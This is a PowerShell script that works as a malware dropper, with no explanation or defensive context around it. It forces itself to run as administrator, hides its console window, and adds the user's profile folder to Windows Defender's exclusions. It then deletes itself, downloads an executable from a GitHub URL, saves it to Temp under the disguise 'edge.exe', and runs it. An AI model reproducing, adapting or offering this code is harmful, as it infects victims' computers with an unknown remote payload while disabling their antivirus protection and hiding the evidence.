if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console
Add-MpPreference -ExclusionPath $env:USERPROFILE
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
$url = 'https://github.com/rosarioian181/projectv/raw/refs/heads/aposee-pages/XClie.exe'
$outputFile = [System.IO.Path]::Combine($env:Temp, 'edge.exe')
Start-Sleep -Milliseconds 100 
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath $outputFile